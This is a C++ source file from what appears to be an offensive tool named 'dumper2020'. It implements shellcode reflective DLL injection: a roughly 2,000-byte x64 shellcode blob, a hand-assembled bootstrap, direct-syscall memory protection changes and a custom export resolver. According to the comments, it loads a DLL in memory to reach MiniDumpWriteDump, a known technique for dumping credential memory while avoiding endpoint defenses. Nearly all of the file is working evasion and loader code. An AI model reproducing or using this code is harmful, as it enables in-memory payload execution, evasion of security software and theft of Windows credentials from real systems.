#include "whisper.h"
#include "srdi.h"
#include <stdio.h>
using namespace std;

// Function:    LoadDLL
// Description: Perform sRDI and load specified DLL
// Arguments:   Char array containing path to DLL
// Called from: dumper2020!GetMiniDumpWriteDump
// Returns:     Handle to loaded DLL for use with GetProcAddressR
// Source:      https://github.com/monoxgas/sRDI
HMODULE LoadDLL(LPSTR dllPath)
{
    LPSTR srdiBuffer = NULL;    // Buffer that will hold the final sRDI blob
    DWORD bufferSize = 0;       // Size of the final sRDI blob
    SYSTEM_INFO sysInfo;        // System info struct
    DWORD oldProtect = 0;       // Original memory page protection setting
    HMODULE dll = NULL;         // Handle to loaded DLL

    // Convert DLL to shellcode
    if (!ConvertToShellcode(dllPath, NULL, NULL, NULL, NULL, srdiBuffer, bufferSize))
        return NULL;

    // Page size and pointer for NtProtectVirtualMemory
    GetNativeSystemInfo(&sysInfo);
    SIZE_T pageSize = sysInfo.dwPageSize;
    PVOID pBuffer = srdiBuffer;

    // Set first page to RX to cover the sRDI boostrap at the top of the blob
    if (NtProtectVirtualMemory(GetCurrentProcess(), &pBuffer, &pageSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        // Perform sRDI and get a handle to the loaded DLL
        RDI rdi = (RDI)(srdiBuffer);
        dll = (HMODULE)rdi();
    }

    // Free sRDI blob
    if (srdiBuffer)
        free(srdiBuffer);

    // Return the handle or NULL on failure
    return dll;
}

// Function:    ConvertToShellcode
// Description: Convert DLL from disk into an sRDI blob in memory
// Arguments:   DLL filename (in), function to execute on load (optional), function parameters (optional),
//              size of function parameters, sRDI flags (optional), output buffer (out), output buffer length (out)
// Called from: LoadDLL
// Returns:     True if successful
// Source:      https://github.com/monoxgas/sRDI
BOOL ConvertToShellcode(LPCSTR dllFile, DWORD userFunction, LPVOID userData, DWORD userSize, DWORD flags, LPSTR &outBytes, DWORD &outSize)
{
    LPSTR dllBytes = NULL;
    DWORD dllSize = 0;
    DWORD dllOffset;
    DWORD userDataLocation;

    LPCSTR rdiShellcode = "\x48\x8B\xC4\x48\x89\x58\x08\x44\x89\x48\x20\x4C\x89\x40\x18\x89\x50\x10\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8D\x68\xA9\x48\x81\xEC\x90\x00\x00\x00\x48\x8B\xF1\xB9\x4C\x77\x26\x07\xE8\xA3\x06\x00\x00\xB9\x49\xF7\x02\x78\x48\x89\x45\xB7\x4C\x8B\xE0\xE8\x92\x06\x00\x00\xB9\x58\xA4\x53\xE5\x48\x89\x45\xBF\x4C\x8B\xE8\xE8\x81\x06\x00\x00\xB9\x10\xE1\x8A\xC3\x4C\x8B\xF8\xE8\x74\x06\x00\x00\xB9\xAF\xB1\x5C\x94\x48\x89\x45\xD7\x48\x8B\xF8\xE8\x63\x06\x00\x00\xB9\x33\x00\x9E\x95\x48\x89\x45\xDF\x48\x8B\xD8\xE8\x52\x06\x00\x00\xB9\x44\xF0\x35\xE0\x4C\x8B\xF0\xE8\x45\x06\x00\x00\x45\x33\xD2\x48\x89\x45\xC7\x4D\x85\xE4\x0F\x84\x16\x06\x00\x00\x4D\x85\xED\x0F\x84\x0D\x06\x00\x00\x4D\x85\xFF\x0F\x84\x04\x06\x00\x00\x48\x85\xFF\x0F\x84\xFB\x05\x00\x00\x48\x85\xDB\x0F\x84\xF2\x05\x00\x00\x4D\x85\xF6\x0F\x84\xE9\x05\x00\x00\x48\x85\xC0\x0F\x84\xE0\x05\x00\x00\x48\x63\x7E\x3C\x48\x03\xFE\x81\x3F\x50\x45\x00\x00\x0F\x85\xCD\x05\x00\x00\xB8\x64\x86\x00\x00\x66\x39\x47\x04\x0F\x85\xBE\x05\x00\x00\x44\x8B\x47\x38\x45\x8D\x5A\x01\x45\x84\xC3\x0F\x85\xAD\x05\x00\x00\x0F\xB7\x47\x06\x41\x8B\xDA\x0F\xB7\x4F\x14\x85\xC0\x74\x28\x48\x83\xC1\x24\x44\x8B\xC8\x48\x03\xCF\x8B\x51\x04\x85\xD2\x75\x07\x8B\x11\x41\x03\xD0\xEB\x02\x03\x11\x3B\xD3\x0F\x47\xDA\x48\x83\xC1\x28\x4D\x2B\xCB\x75\xE2\x48\x8D\x4D\xE7\x41\xFF\xD6\x8B\x55\xEB\x44\x8D\x72\xFF\x44\x03\x77\x50\x8D\x42\xFF\xF7\xD0\x48\x8D\x4A\xFF\x44\x23\xF0\x8B\xC3\x48\x03\xC8\x48\x8D\x42\xFF\x48\xF7\xD0\x48\x23\xC8\x4C\x3B\xF1\x0F\x85\x40\x05\x00\x00\x48\x8B\x4F\x30\x41\xB9\x04\x00\x00\x00\x41\xB8\x00\x30\x00\x00\x41\x8B\xD6\x41\xFF\xD7\x48\x8B\xD8\x48\x85\xC0\x75\x15\x44\x8D\x48\x04\x41\xB8\x00\x30\x00\x00\x41\x8B\xD6\x33\xC9\x41\xFF\xD7\x48\x8B\xD8\x44\x8B\x5D\x7F\x41\xBE\x01\x00\x00\x00\x45\x84\xDE\x0F\x84\xB1\x00\x00\x00\x8B\x46\x3C\x89\x43\x3C\x8B\x56\x3C\xEB\x0B\x8B\xCA\x41\x03\xD6\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\x45\x33\xFF\x48\x63\x7B\x3C\x45\x8B\xD7\x48\x03\xFB\x48\x89\x7D\xCF\x0F\xB7\x47\x14\x66\x44\x3B\x7F\x06\x73\x3E\x4C\x8D\x47\x28\x4C\x03\xC0\x45\x8B\xCF\x45\x39\x38\x76\x1F\x41\x8B\x50\x04\x41\x8B\x48\xFC\x41\x8B\xC1\x45\x03\xCE\x48\x03\xC8\x48\x03\xD0\x8A\x04\x32\x88\x04\x19\x45\x3B\x08\x72\xE1\x0F\xB7\x47\x06\x45\x03\xD6\x49\x83\xC0\x28\x44\x3B\xD0\x72\xC9\x4C\x8B\xD3\x4C\x2B\x57\x30\x0F\x84\xDE\x00\x00\x00\x44\x39\xBF\xB4\x00\x00\x00\x0F\x84\xD1\x00\x00\x00\x44\x8B\x87\xB0\x00\x00\x00\x4C\x03\xC3\x45\x39\x38\x0F\x84\xBE\x00\x00\x00\x41\xBC\x02\x00\x00\x00\x4D\x8D\x48\x08\xE9\x93\x00\x00\x00\x45\x33\xFF\x41\x8B\xD7\x44\x39\x7F\x54\x0F\x86\x5D\xFF\xFF\xFF\x8B\xCA\x41\x03\xD6\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\xE9\x48\xFF\xFF\xFF\x41\x0F\xB7\x01\x0F\xB7\xC8\x66\xC1\xE9\x0C\x66\x83\xF9\x0A\x75\x11\x41\x8B\x08\x25\xFF\x0F\x00\x00\x48\x03\xC3\x4C\x01\x14\x01\xEB\x49\x66\x83\xF9\x03\x75\x0E\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x8B\xC2\xEB\x2E\x66\x41\x3B\xCE\x75\x15\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x49\x8B\xC2\x48\xC1\xE8\x10\x0F\xB7\xC0\xEB\x13\x66\x41\x3B\xCC\x75\x14\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x0F\xB7\xC2\x41\x8B\x10\x48\x01\x04\x0A\x4D\x03\xCC\x41\x8B\x40\x04\x49\x03\xC0\x4C\x3B\xC8\x75\x86\x4D\x8B\xC1\x45\x39\x39\x0F\x85\x4C\xFF\xFF\xFF\x4C\x8B\x65\xB7\x44\x39\xBF\x94\x00\x00\x00\x0F\x84\x45\x01\x00\x00\x44\x8B\x87\x90\x00\x00\x00\x45\x8B\xEF\x4C\x03\xC3\x49\x8D\x40\x0C\xEB\x07\x45\x03\xEE\x48\x8D\x40\x14\x44\x39\x38\x75\xF4\x41\x8B\xC3\x83\xE0\x04\x89\x45\xB3\x0F\x84\x82\x00\x00\x00\x45\x3B\xEE\x76\x7D\x41\xC1\xEB\x10\x45\x8D\x4D\xFF\x44\x89\x5D\x7F\x45\x8B\xDF\x45\x85\xC9\x74\x6F\x4D\x8B\xD0\x41\x0F\x10\x02\x33\xD2\x41\x8B\xCD\x41\x2B\xCB\x69\xF6\xFD\x43\x03\x00\xB8\xFF\x7F\x00\x00\xF7\xF1\x33\xD2\x81\xC6\xC3\x9E\x26\x00\x41\x8D\x0C\x06\x8B\xC6\xC1\xE8\x10\x25\xFF\x7F\x00\x00\xF7\xF1\x41\x03\xC3\x45\x03\xDE\x48\x8D\x0C\x80\x41\x8B\x54\x88\x10\x41\x0F\x10\x0C\x88\x41\x0F\x11\x04\x88\x41\x8B\x42\x10\x41\x89\x44\x88\x10\x41\x0F\x11\x0A\x41\x89\x52\x10\x4D\x8D\x52\x14\x45\x3B\xD9\x72\x9C\xEB\x06\x8B\x45\xB3\x89\x45\x7F\x8B\xB7\x90\x00\x00\x00\x48\x03\xF3\x8B\x46\x0C\x85\xC0\x74\x7B\x8B\x7D\x7F\x8B\xC8\x48\x03\xCB\x41\xFF\xD4\x44\x8B\x3E\x4C\x8B\xE0\x44\x8B\x76\x10\x4C\x03\xFB\x4C\x03\xF3\x49\x8B\x0F\x48\x85\xC9\x74\x2D\x48\x8B\x7D\xBF\x79\x05\x0F\xB7\xD1\xEB\x07\x48\x8D\x51\x02\x48\x03\xD3\x49\x8B\xCC\xFF\xD7\x49\x83\xC7\x08\x49\x89\x06\x49\x83\xC6\x08\x49\x8B\x0F\x48\x85\xC9\x75\xDA\x8B\x7D\x7F\x45\x33\xFF\x44\x39\x7D\xB3\x74\x0F\x41\x83\xFD\x01\x76\x09\x69\xCF\xE8\x03\x00\x00\xFF\x55\xC7\x8B\x46\x20\x48\x83\xC6\x14\x4C\x8B\x65\xB7\x85\xC0\x75\x8C\x48\x8B\x7D\xCF\x4C\x8B\x6D\xBF\x44\x39\xBF\xF4\x00\x00\x00\x74\x68\x44\x8B\xB7\xF0\x00\x00\x00\x49\x83\xC6\x04\x4C\x03\xF3\xEB\x53\x41\x8B\x0E\x48\x03\xCB\x41\xFF\xD4\x41\x8B\x76\x08\x4C\x8B\xE0\x45\x8B\x7E\x0C\x48\x03\xF3\x4C\x03\xFB\xEB\x25\x49\x8B\x0F\x48\x85\xC9\x79\x05\x0F\xB7\xD1\xEB\x07\x48\x8D\x51\x02\x48\x03\xD3\x49\x8B\xCC\x41\xFF\xD5\x48\x89\x06\x48\x83\xC6\x08\x49\x83\xC7\x08\x33\xC0\x48\x39\x06\x75\xD4\x4C\x8B\x65\xB7\x49\x83\xC6\x20\x45\x33\xFF\x45\x39\x3E\x75\xA8\x45\x8B\xF7\x0F\xB7\x47\x14\x41\xBC\x01\x00\x00\x00\x66\x44\x3B\x7F\x06\x0F\x83\xCF\x00\x00\x00\x4C\x8B\x7D\xD7\x48\x8D\x77\x3C\x48\x03\xF0\x45\x33\xC9\x44\x39\x4E\xEC\x0F\x84\xA0\x00\x00\x00\x8B\x0E\x8B\xD1\xC1\xEA\x1E\x8B\xC1\x41\x23\xD4\xC1\xE8\x1D\xC1\xE9\x1F\x41\x23\xC4\x75\x24\x85\xD2\x75\x0E\xF7\xD9\x45\x1B\xC0\x41\x83\xE0\x07\x45\x03\xC4\xEB\x4F\xF7\xD9\xB8\x02\x00\x00\x00\x45\x1B\xC0\x44\x23\xC0\x44\x03\xC0\xEB\x3D\x85\xD2\x75\x20\x85\xC9\x75\x06\x44\x8D\x42\x10\xEB\x2F\x85\xD2\x75\x12\x85\xC9\x74\x08\x41\xB8\x80\x00\x00\x00\xEB\x1F\x44\x8B\x45\xAF\xEB\x1D\x85\xC9\x75\x06\x44\x8D\x41\x20\xEB\x0F\x44\x8B\x45\xAF\x85\xC9\xB8\x40\x00\x00\x00\x44\x0F\x45\xC0\x44\x89\x45\xAF\xF7\x06\x00\x00\x00\x04\x74\x09\x41\x0F\xBA\xE8\x09\x44\x89\x45\xAF\x8B\x4E\xE8\x4C\x8D\x4D\xAF\x8B\x56\xEC\x48\x03\xCB\x41\xFF\xD7\x45\x33\xC9\x0F\xB7\x47\x06\x45\x03\xF4\x48\x83\xC6\x28\x44\x3B\xF0\x0F\x82\x42\xFF\xFF\xFF\x45\x33\xFF\x45\x33\xC0\x33\xD2\x48\x83\xC9\xFF\xFF\x55\xDF\x44\x39\xBF\xD4\x00\x00\x00\x74\x24\x8B\x87\xD0\x00\x00\x00\x48\x8B\x74\x18\x18\xEB\x0F\x45\x33\xC0\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x48\x8D\x76\x08\x48\x8B\x06\x48\x85\xC0\x75\xE9\x8B\x47\x28\x4D\x8B\xC4\x48\x03\xC3\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x8B\x75\x67\x85\xF6\x0F\x84\x96\x00\x00\x00\x44\x39\xBF\x8C\x00\x00\x00\x0F\x84\x89\x00\x00\x00\x8B\x8F\x88\x00\x00\x00\x48\x03\xCB\x44\x8B\x59\x18\x45\x85\xDB\x74\x77\x44\x39\x79\x14\x74\x71\x44\x8B\x49\x20\x41\x8B\xFF\x8B\x51\x24\x4C\x03\xCB\x48\x03\xD3\x45\x85\xDB\x74\x5C\x45\x8B\x01\x45\x8B\xD7\x4C\x03\xC3\x74\x51\xEB\x10\x0F\xBE\xC0\x41\x03\xC2\x44\x8B\xD0\x41\xC1\xCA\x0D\x4D\x03\xC4\x41\x8A\x00\x84\xC0\x75\xE9\x41\x3B\xF2\x75\x05\x48\x85\xD2\x75\x16\xB8\x02\x00\x00\x00\x41\x03\xFC\x48\x03\xD0\x49\x83\xC1\x04\x41\x3B\xFB\x73\x1A\xEB\xBC\x8B\x49\x1C\x0F\xB7\x12\x48\x03\xCB\x8B\x04\x91\x8B\x55\x77\x48\x03\xC3\x48\x8B\x4D\x6F\xFF\xD0\x48\x8B\xC3\xEB\x02\x33\xC0\x48\x8B\x9C\x24\xD0\x00\x00\x00\x48\x81\xC4\x90\x00\x00\x00\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5F\x5E\x5D\xC3\xCC\xCC\x48\x89\x5C\x24\x08\x48\x89\x74\x24\x10\x57\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xF1\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB4\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x33\xD2\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x42\x8B\x9C\x00\x88\x00\x00\x00\x85\xDB\x74\xD4\x48\x8B\x04\x24\x48\xC1\xE8\x10\x44\x0F\xB7\xD0\x45\x85\xD2\x74\x21\x48\x8B\x4C\x24\x08\x45\x8B\xDA\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEB\x01\x75\xE7\x4D\x8D\x14\x18\x33\xC9\x41\x8B\x7A\x20\x49\x03\xF8\x41\x39\x4A\x18\x76\x8F\x8B\x1F\x45\x33\xDB\x49\x03\xD8\x48\x8D\x7F\x04\x0F\xBE\x03\x48\xFF\xC3\x41\xC1\xCB\x0D\x44\x03\xD8\x80\x7B\xFF\x00\x75\xED\x41\x8D\x04\x13\x3B\xC6\x74\x0D\xFF\xC1\x41\x3B\x4A\x18\x72\xD1\xE9\x5B\xFF\xFF\xFF\x41\x8B\x42\x24\x03\xC9\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x74\x24\x28\x48\x83\xC4\x10\x5F\xC3";
    DWORD rdiShellcodeLength = 1997;

    // Get DLL bytes from disk
    if (!GetFileContents(dllFile, &dllBytes, dllSize))
        return FALSE;

    // Sanity check to verify we have a PE
    if (dllBytes[0] != 'M' || dllBytes[1] != 'Z')
        return FALSE;
    
    // Initialize sRDI bootstrap
    BYTE bootstrap[64] = { 0 };
    DWORD i = 0;

    // call next instruction (Pushes next instruction address to stack)
    bootstrap[i++] = 0xe8;
    bootstrap[i++] = 0x00;
    bootstrap[i++] = 0x00;
    bootstrap[i++] = 0x00;
    bootstrap[i++] = 0x00;

    // Set the offset to our DLL from pop result
    dllOffset = sizeof(bootstrap) - i + rdiShellcodeLength;

    // pop rcx - Capture our current location in memory
    bootstrap[i++] = 0x59;

    // mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
    bootstrap[i++] = 0x49;
    bootstrap[i++] = 0x89;
    bootstrap[i++] = 0xc8;

    // add rcx, <Offset of the DLL>
    bootstrap[i++] = 0x48;
    bootstrap[i++] = 0x81;
    bootstrap[i++] = 0xc1;
    MoveMemory(bootstrap + i, &dllOffset, sizeof(dllOffset));
    i += sizeof(dllOffset);

    // mov edx, <hash of function>
    bootstrap[i++] = 0xba;
    MoveMemory(bootstrap + i, &userFunction, sizeof(userFunction));
    i += sizeof(userFunction);

    // Setup the location of our user data
    // add r8, <Offset of the DLL> + <Length of DLL>
    bootstrap[i++] = 0x49;
    bootstrap[i++] = 0x81;
    bootstrap[i++] = 0xc0;
    userDataLocation = dllOffset + dllSize;
    MoveMemory(bootstrap + i, &userDataLocation, sizeof(userDataLocation));
    i += sizeof(userDataLocation);

    // mov r9d, <Length of User Data>
    bootstrap[i++] = 0x41;
    bootstrap[i++] = 0xb9;
    MoveMemory(bootstrap + i, &userSize, sizeof(userSize));
    i += sizeof(userSize);

    // push rsi - save original value
    bootstrap[i++] = 0x56;

    // mov rsi, rsp - store our current stack pointer for later
    bootstrap[i++] = 0x48;
    bootstrap[i++] = 0x89;
    bootstrap[i++] = 0xe6;

    // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
    bootstrap[i++] = 0x48;
    bootstrap[i++] = 0x83;
    bootstrap[i++] = 0xe4;
    bootstrap[i++] = 0xf0;

    // sub rsp, 0x30 - Create some breathing room on the stack 
    bootstrap[i++] = 0x48;
    bootstrap[i++] = 0x83;
    bootstrap[i++] = 0xec;
    bootstrap[i++] = 6 * 8; // 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment

    // mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
    bootstrap[i++] = 0xC7;
    bootstrap[i++] = 0x44;
    bootstrap[i++] = 0x24;
    bootstrap[i++] = 4 * 8;
    MoveMemory(bootstrap + i, &flags, sizeof(flags));
    i += sizeof(flags);

    // call - Transfer execution to the RDI
    bootstrap[i++] = 0xe8;
    bootstrap[i++] = (BYTE)(sizeof(bootstrap) - i - 4); // Skip over the remainder of instructions
    bootstrap[i++] = 0x00;
    bootstrap[i++] = 0x00;
    bootstrap[i++] = 0x00;
        
    // mov rsp, rsi - Reset our original stack pointer
    bootstrap[i++] = 0x48;
    bootstrap[i++] = 0x89;
    bootstrap[i++] = 0xf4;
        
    // pop rsi - Put things back where we left them
    bootstrap[i++] = 0x5e;

    // ret - return to caller
    bootstrap[i++] = 0xc3;

    // Ends up looking like this in memory:
    // Bootstrap shellcode
    // RDI shellcode
    // DLL bytes
    // User data
    outSize = dllSize + userSize + rdiShellcodeLength + sizeof(bootstrap);
    outBytes = (LPSTR)malloc(outSize);
    MoveMemory(outBytes, bootstrap, sizeof(bootstrap));
    MoveMemory(outBytes + sizeof(bootstrap), rdiShellcode, rdiShellcodeLength);
    MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength, dllBytes, dllSize);
    MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength + dllSize, userData, userSize);

    return TRUE;
}

// Function:    GetFileContents
// Description: Read contents of file from disk
// Arguments:   Path to file (in), pointer to buffer (out), size of buffer (out)
// Called from: ConvertToShellcode
// Returns:     True if successful
// Source:      https://github.com/monoxgas/sRDI
BOOL GetFileContents(LPCSTR filename, LPSTR *contents, DWORD &size)
{
    FILE *fp;
    errno_t err = fopen_s(&fp, filename, "rb");

    if (fp)
    {
        fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        *contents = (LPSTR)malloc(size + 1);
        fread(*contents, size, 1, fp);
        fclose(fp);

        return TRUE;
    }

    return FALSE;
}

// Function:    GetProcAddressR
// Description: Get pointer to a function in a DLL loaded via sRDI
// Arguments:   Handle to a DLL loaded via sRDI and the function name
// Called from: dumper2020!Dump
// Returns:     Pointer to the requested function if found
// Source:      https://github.com/monoxgas/sRDI
FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
{
    if (hModule == NULL || lpProcName == NULL)
        return NULL;

    PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
    PIMAGE_DATA_DIRECTORY dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dataDir->Size)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress);
    if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
        return NULL;

    PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames);
    PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals);
    LPCSTR expNameStr;

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++) {

        expNameStr = RVA(LPCSTR, hModule, *expName);

        if (!expNameStr)
            break;

        if (!_stricmp(lpProcName, expNameStr)) {
            DWORD funcRva = *RVA(PDWORD, hModule, exportDir->AddressOfFunctions + (*expOrdinal * 4));
            return RVA(FARPROC, hModule, funcRva);
        }
    }

    return NULL;
}
